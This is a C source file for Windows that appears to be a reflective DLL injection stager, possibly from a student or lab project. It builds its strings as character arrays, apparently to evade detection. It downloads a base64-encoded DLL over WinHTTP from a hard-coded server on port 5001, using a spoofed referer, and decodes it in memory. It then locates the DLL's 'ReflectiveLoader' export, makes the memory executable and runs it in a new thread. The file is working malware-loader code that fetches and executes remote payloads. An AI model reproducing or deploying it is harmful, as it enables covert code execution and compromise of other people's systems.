#include <stdio.h>
#include <windows.h>
#include <winhttp.h>
#include <shlwapi.h>

LPVOID winHTTPClient(PDWORD pdwDllSize) {
    WCHAR wVerb[4] = {
      'G', 'E', 'T', 0
    };

    WCHAR wEndpoint[8] = {
      '/', 's', 't', 'a', 'g', 'e', '/', 0
    };

    WCHAR wUserAgent[8] = {
      'I', 'm', 'h', 'u', 'l', 'l', 'u', 0
    };

    WCHAR wVersion[5] = {
      'H', 'T', 'T', 'P', 0
    };

    WCHAR wReferer[19] = {
    'h', 't', 't', 'p', 's', ':', '/', '/', 'g', 'o', 'o', 'g', 'l', 'e', '.', 'c', 'o', 'm', 0
    };

    /*
    // Home
    WCHAR wServer[13] = {
      '1', '9', '2', '.', '1', '6', '8', '.', '1', '.', '2', '0', 0
    };
*/

    /*
    // School
    WCHAR wServer[14] = {'1', '4', '5', '.', '9', '3', '.', '5', '3', '.', '2', '1', '5', 0};
    */
    
    // Host-Only
    WCHAR wServer[12] = {'1', '9', '2', '.', '1', '6', '8', '.', '0', '.', '1', 0};


    WCHAR wProxy[] = {'W', 'I', 'N', 'H','T','T','P', '_', 'N','O','_','P','R','O','X','Y','_','N','A','M','E', 0};
    WCHAR wProxyBypass[] = {'W', 'I', 'N', 'H','T','T','P', '_', 'N','O','_','P','R','O','X','Y','_','B','Y','P','A','S','S',0};

    //WCHAR wServer[13] = {
    //  '1', '4', '5', '.', '9', '3', '.', '5', '4', '.', '7', '2', 0
    //};
    //WCHAR wServer[12] = {
    //  '1', '9', '2', '.', '1', '6', '8', '.', '0', '.', '1', 0
    //};

    INTERNET_PORT dwPort = 5001;

    HINTERNET hSession = WinHttpOpen(
        wUserAgent,
        1,                      // WINHTTP_ACCESS_TYPE_NO_PROXY
        wProxy,
        wProxyBypass,
        0
    );

    if (hSession == NULL){
        WCHAR error[] = {'O', 'p', 'e', 'n', 'F', 0};
        wprintf(error);
        DWORD errorCode = GetLastError();
        WCHAR myFormat2[] = {'G', 'e', 't', 'E', 'r', 'r', 'o', 'r', ':', ' ', '%', 'd', '\n', 0};
        wprintf(myFormat2, errorCode);
    }

    HINTERNET hConnect = WinHttpConnect(
        hSession,
        wServer,
        dwPort,
        0
    );

    if (hConnect == NULL){
        WCHAR error[] = {'C', 'o', 'n', 'n', 'F', 0};
        wprintf(error);
        DWORD errorCode = GetLastError();
        WCHAR myFormat2[] = {'G', 'e', 't', 'E', 'r', 'r', 'o', 'r', ':', ' ', '%', 'd', '\n', 0};
        wprintf(myFormat2, errorCode);
    }

    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect,
        wVerb,
        wEndpoint,
        wVersion,
        wReferer,
        NULL,
        0
    );

    if (hRequest == NULL){
        WCHAR error[] = {'R', 'e', 'q', 'F', '\n', 0};
        wprintf(error);
        DWORD errorCode = GetLastError();
        WCHAR myFormat2[] = {'G', 'e', 't', 'E', 'r', 'r', 'o', 'r', ':', ' ', '%', 'd', '\n', 0};
        wprintf(myFormat2, errorCode);
    }

    // Send the request
    BOOL reqSuccess = WinHttpSendRequest(
        hRequest,
        NULL,
        0,
        NULL,
        0, 0, 0
    );

    if (reqSuccess == FALSE) {
        WCHAR error[] = {'S', 'e', 'n', 'd', 'F', '\n', 0};
        wprintf(error);
        DWORD errorCode = GetLastError();
        WCHAR myFormat2[] = {'G', 'e', 't', 'E', 'r', 'r', 'o', 'r', ':', ' ', '%', 'd', '\n', 0};
        wprintf(myFormat2, errorCode);
    }

    BOOL rcvResponse = WinHttpReceiveResponse(hRequest, NULL);
    if (rcvResponse == FALSE) {
        WCHAR error[] = {'r', 'c', 'v', 'R', 'e', 's', 'p', 'o', 'n', 's', 'e', 'F', ' ', '%', 'd', '\n', 0};
        wprintf(error, rcvResponse);
        DWORD errorCode = GetLastError();
        WCHAR myFormat2[] = {'G', 'e', 't', 'E', 'r', 'r', 'o', 'r', ':', ' ', '%', 'd', '\n', 0};
        wprintf(myFormat2, errorCode);
    }

    LPVOID lpContentLength = NULL;
    DWORD dwBufferLength = 0;
    BOOL result = FALSE;
    // Calculates the needed buffer length for the content length string if the 4th param is null and returns ERROR_INSUFFICIENT_BUFFER
    WinHttpQueryHeaders( hRequest, WINHTTP_QUERY_CONTENT_LENGTH, WINHTTP_HEADER_NAME_BY_INDEX, NULL, &dwBufferLength, WINHTTP_NO_HEADER_INDEX);

    if (GetLastError() == ERROR_INSUFFICIENT_BUFFER)
    {
        // Allocate the calculated buffer
        lpContentLength = malloc(dwBufferLength/sizeof(WCHAR));

        result = WinHttpQueryHeaders( hRequest, WINHTTP_QUERY_CONTENT_LENGTH, WINHTTP_HEADER_NAME_BY_INDEX, lpContentLength, &dwBufferLength, WINHTTP_NO_HEADER_INDEX);
    }

    if (result) {
        *pdwDllSize = StrToIntW((WCHAR*)lpContentLength);
        printf("Content-Length: %S\n", lpContentLength);
    }
    else { printf("Failed reading 'Content-Length'"); exit(0); }

    /*
    LPVOID lpContentLength = calloc(128, sizeof(char));
    DWORD dwBufferLength = sizeof(char)*16;

    printf("GETTING CONTENT LENGTH INFO\n");
    if (WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_CONTENT_LENGTH, WINHTTP_HEADER_NAME_BY_INDEX, lpContentLength, &dwBufferLength, WINHTTP_NO_HEADER_INDEX))
    {
        wprintf(L"Content-Length: %S\n", (WCHAR*)lpContentLength);
        wprintf(L"Size of buffer: %d\n", dwBufferLength);
    }
    else {
        wprintf(L"CONTENT LENGTH INFO FAILED\n");
        wprintf(L"Last error: %d\n ", GetLastError());
    }
    */

    /*
    DWORD availableBytes = 0;
    BOOL qryDataAvailable = WinHttpQueryDataAvailable(hRequest, &availableBytes);
    if (qryDataAvailable == FALSE) {
        WCHAR error[] = {'q', 'r', 'y', 'D', 'a', 't', 'a', 'F', 0};
        wprintf(error);
    }
    */

    LPVOID lpEncodedBuffer = (LPVOID)(calloc)((size_t)(*pdwDllSize), (size_t)sizeof(WCHAR));
    WCHAR* wcEncodedBuffer = (WCHAR*)lpEncodedBuffer;
    DWORD bufferIndexChange = 0;
    DWORD availableBytes = 0;
    DWORD actuallyRead = 0;
    LPDWORD lpActuallyRead = &actuallyRead;
  
    while(WinHttpQueryDataAvailable(hRequest, &availableBytes) && availableBytes != 0) {
        //printf("Available Bytes: %d\n", availableBytes);
        BOOL readSuccess = WinHttpReadData(
            hRequest,
            (LPVOID)(wcEncodedBuffer+bufferIndexChange),
            availableBytes,
            lpActuallyRead
        );
        if (bufferIndexChange + (availableBytes / sizeof(WCHAR)) > *pdwDllSize / sizeof(WCHAR)) {
            printf("Buffer overflow risk, stopping read.\n");
            break;
        }
        bufferIndexChange += availableBytes/sizeof(WCHAR);
    }

    printf("Received DLL\n");

    MessageBox(0, lpEncodedBuffer, lpEncodedBuffer, 0x0L);

    LPVOID lpRawBuffer = (LPVOID)(calloc((size_t)(*pdwDllSize), (size_t)sizeof(WCHAR)));  // Convert base64 to bytes
    DWORD lengthBuffer = CryptStringToBinaryA((LPVOID)lpEncodedBuffer, *pdwDllSize, 0x000000001, lpRawBuffer, pdwDllSize, NULL, NULL);

    MessageBox(0, lpRawBuffer, lpRawBuffer, 0x0L);
    free((LPVOID)lpEncodedBuffer);
    free(lpContentLength);
    return lpRawBuffer;
}


DWORD Rva2Offset(DWORD dwRva, UINT_PTR uiBaseAddress) {
    WORD wIndex = 0;
    PIMAGE_SECTION_HEADER pSectionHeader = NULL;
    PIMAGE_NT_HEADERS pNtHeaders = NULL;

    pNtHeaders =
        (PIMAGE_NT_HEADERS)(uiBaseAddress +
                            ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew);

    pSectionHeader =
        (PIMAGE_SECTION_HEADER)((UINT_PTR)(&pNtHeaders->OptionalHeader) +
                                pNtHeaders->FileHeader.SizeOfOptionalHeader);

    if (dwRva < pSectionHeader[0].PointerToRawData)
        return dwRva;

    for (wIndex = 0; wIndex < pNtHeaders->FileHeader.NumberOfSections; wIndex++) {
        if (dwRva >= pSectionHeader[wIndex].VirtualAddress &&
            dwRva < (pSectionHeader[wIndex].VirtualAddress +
                    pSectionHeader[wIndex].SizeOfRawData))
            return (dwRva - pSectionHeader[wIndex].VirtualAddress +
                  pSectionHeader[wIndex].PointerToRawData);
    }

    return 0;
}

int my_strcmp(const char *p1, const char *p2) {
    const unsigned char *s1 = (const unsigned char *)p1;
    const unsigned char *s2 = (const unsigned char *)p2;
    unsigned char c1, c2;
    do {
        c1 = (unsigned char)*s1++;
        c2 = (unsigned char)*s2++;
        if (c1 == '\0') {
          return c1 - c2;
        }
    } while (c1 == c2);
    return c1 - c2;
}

#define DEREF(name) *(UINT_PTR *)(name)
#define DEREF_64(name) *(DWORD64 *)(name)
#define DEREF_32(name) *(DWORD *)(name)
#define DEREF_16(name) *(WORD *)(name)
#define DEREF_8(name) *(BYTE *)(name)

int main(void) {
    CHAR rlName[] = { 'R', 'e', 'f', 'l', 'e', 'c', 't', 'i', 'v', 'e', 'L', 'o', 'a', 'd', 'e', 'r', 0 };

    DWORD dwDllSize;
    LPVOID lpDll = winHTTPClient(&dwDllSize);
    printf("Dll size: %d\n", dwDllSize);

    UINT_PTR uiDll = (UINT_PTR)lpDll;
    WCHAR uiDllFormat[] = { 'd', 'l', 'l', 'A', 'd', 'd', 'r', 'e', 's', 's', ':', ' ', '%', 'p', '\n', 0 };
    wprintf(uiDllFormat, uiDll);

    UINT_PTR uiNtHeaders = 0;
    UINT_PTR uiExportDirectoryData = 0;
    UINT_PTR uiExportDirectory = 0;

    uiNtHeaders = uiDll + ((PIMAGE_DOS_HEADER)uiDll)->e_lfanew;
    WCHAR ntHeaders[] = { 'n', 't', 'h', 'e', 'a', 'd', 'e', 'r', 's', ':', ' ', '%', 'p', '\n', 0 };
    wprintf(ntHeaders, uiNtHeaders);

    uiExportDirectoryData = (UINT_PTR) &((PIMAGE_NT_HEADERS64)uiNtHeaders)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

    // DEBUG: ExportDirectoryData is correct
    //ExportDirectoryData = OptionalHeaders.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    //ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(uiDll + Rva2Offset(ExportDirectoryData.VirtualAddress, uiDll));
    uiExportDirectory = uiDll + Rva2Offset(((PIMAGE_DATA_DIRECTORY)uiExportDirectoryData)->VirtualAddress, uiDll);
    WCHAR pExportDir[] = { 'e', 'x', 'p', 'o', 'r', 't', 'd', 'i', 'r', ':', ' ', '%', 'p', '\n', 0 };
    wprintf(pExportDir, uiExportDirectory);

    DWORD uiExportDirectorySize = ((PIMAGE_DATA_DIRECTORY)uiExportDirectoryData)->Size;
    WCHAR pExportDirSize[] = { 'e', 'x', 'p', 'o', 'r', 't', 's', 'i', 'z', 'e', ':', ' ', '%', 'd', '\n', 0 };
    wprintf(pExportDirSize, uiExportDirectorySize);

    DWORD dwNumberOfEntries;
    UINT_PTR functionNameAddresses;
    UINT_PTR functionOrdinals;
    UINT_PTR functionAddresses;
    UINT_PTR nameRva;
    UINT_PTR nameAdr;
    UINT_PTR rlAddress;

    dwNumberOfEntries = ((PIMAGE_EXPORT_DIRECTORY)uiExportDirectory)->NumberOfNames;
    printf("Number of name pointers: %d\n", dwNumberOfEntries);

    functionNameAddresses = uiDll + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDirectory)->AddressOfNames, uiDll);
    functionOrdinals = uiDll + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDirectory)->AddressOfNameOrdinals, uiDll);
    functionAddresses = uiDll + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDirectory)->AddressOfFunctions, uiDll);

    CHAR* exportedFunctionName;
    while(dwNumberOfEntries--) {
        exportedFunctionName = (CHAR*)(uiDll + Rva2Offset(DEREF(functionNameAddresses), uiDll));
        if (my_strcmp(exportedFunctionName, "ReflectiveLoader") != 0)
        {
            functionNameAddresses += sizeof(DWORD); // 32 bit pointers
            functionOrdinals += sizeof(WORD);       // Ordinal values or 16 bit
            continue;
        }
        else {
            printf("Rl found!\n");
            // Get the index from the ordinal table, multiply by the size
            // of how big one address in the function address table is.
            // This will give us the number to add to the pointer to
            // `functionAddresses` to get the offset to the RL.
            // Remember, this offset is from the reflective DLL's current
            // address. It will be used to pass to CreateThread as it's
            // fourth parameter (thread s tarting point) //
            functionAddresses += DEREF_16(functionOrdinals) * sizeof(DWORD);
            rlAddress = uiDll + Rva2Offset(DEREF_32(functionAddresses), uiDll);
            printf("Reflective Loader found at: %p\n ", rlAddress);
            break;
        }
    }

    typedef DWORD (WINAPI *REFLECTIVELOADER)( VOID );
  
    DWORD dwOldProtect;
    VirtualProtect((LPVOID)uiDll, dwDllSize, PAGE_EXECUTE_READWRITE, &dwOldProtect);
    //DWORD nice = ((REFLECTIVELOADER)rlAddress)();
    //VirtualProtect((LPVOID)uiDll, dwDllSize, dwOldProtect, )

    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)rlAddress, NULL, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
}
